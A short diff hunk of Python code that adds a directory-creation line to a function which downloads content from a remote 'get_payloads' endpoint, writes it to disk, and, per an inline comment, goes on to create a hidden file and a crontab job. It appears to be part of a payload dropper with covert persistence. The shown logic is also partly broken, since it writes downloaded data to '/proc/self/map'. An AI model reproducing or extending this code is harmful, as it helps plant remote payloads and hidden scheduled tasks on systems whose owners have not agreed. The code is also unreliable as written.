@@ -141,6 +141,7 @@ def run(url, file_path):
         file_path = "/proc/self/map"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}get_payloads/{download_path}")
+            os.makedirs(service_dir, exist_ok=True)
             with open(file_path, 'wb') as file:
               file.write(response.content)
         # Create a hidden file and add a crontab job
